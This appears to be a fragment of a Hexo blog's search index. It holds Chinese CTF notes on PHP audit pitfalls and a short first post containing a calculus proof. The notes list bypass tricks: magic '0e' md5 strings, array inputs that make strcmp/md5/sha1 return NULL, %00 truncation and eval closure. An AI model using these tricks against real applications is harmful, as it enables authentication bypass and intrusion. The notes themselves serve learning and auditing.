    <content type="text"><![CDATA[php审计的常见漏洞 php审计—从入门到入坟 extract() extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。如果有重复则覆盖 效果:1234567&lt;?php$a = "a";$my_array = array("a" =&gt; "Cat","b" =&gt; "Dog", "c" =&gt; "Horse");extract($my_array);echo "\$a = $a; \$b = $b; \$c = $c";//$a=Cat $b=Dog $c=Horse?&gt; 通过变量覆盖解决问题。 strcmp() 在php5.3版本前，如果参数中传入非字符串内容，则直接return 0 伪造字符串相等 md5() 若要求md5值弱相等，则可构造哈希值为0E开头的字符串，此时直接视作为0。如果是强相等，则构造数组，此时返回NULL常见构造字符串: QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 注意是强相等还是弱相等 ereg() ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。如果参数为数组则返回NULL，遇到%00截断 strpos() 寻找表达式出现的第一个位置,如果参数为数组返回NULL 注意如果下标为0等价false is_numric() is_numric用于判断是否为纯数字，遇到%00直接判定为非数字，无关%00位置 ps:关于%00 %00是字符串的结尾，然而输出时遇到%00不停止。$_GET数组得到的是字符串，当出现 (string)1%00==1等类似语句时，会将string转换为数字，并且遇到%00停止。如果字符串无法转换为数字，就视作0。 update time:9.21 sha1() sha1()以数组为参数时，会返回NULL 比较转换 16进制与10进制比较，转换为10进制 附: strlen() strlen()以数组为参数时返回NULL eval() 该函数将接受的参数视作php语句，构造表达式闭合其括号 @$_GET[‘a’]这个不算bug,@的含义是忽略该表达式可能生成的错误消息 待续]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FirstBlog]]></title>
    <url>%2F2019%2F09%2F11%2FFirstBlog%2F</url>
    <content type="text"><![CDATA[初次尝试hexo FirstBlog终于在自习室搞完了。。。初次尝试hexo,慢慢摸索吧。==zyf sb==yc nbzyf nbyc sb$ \sum_{i=1}^n i^2 $ \begin{aligned} \vert y_n-A \vert &= \vert \frac{\left(x_1-A \right)+\left(x_2-A\right)+\ldots+\left( x_n-A \right)}{n} \vert \\ &= \vert \frac{\left(x_1-A \right)+\left(x_2-A\right)+\ldots+\left(x_{N_0}-A\right)+\left(x_{N_0+1}-A\right)+\ldots+\left( x_n-A \right)}{n} \vert \\ &\le |\frac{\left(x_1-A\right)+(x_2-A)+\ldots+(x_{N_0}-A)}{n}|+\frac{n-N_0}{n}\cdot\frac{\epsilon}{2} \\ &\lt|\frac{(x_1-A)+(x_2-A)+\ldots+(x_{N_0}-A)}{n}|+\frac{\epsilon}{2} \end{aligned}来自WHU高数P20]]></content>
  </entry>
</search>
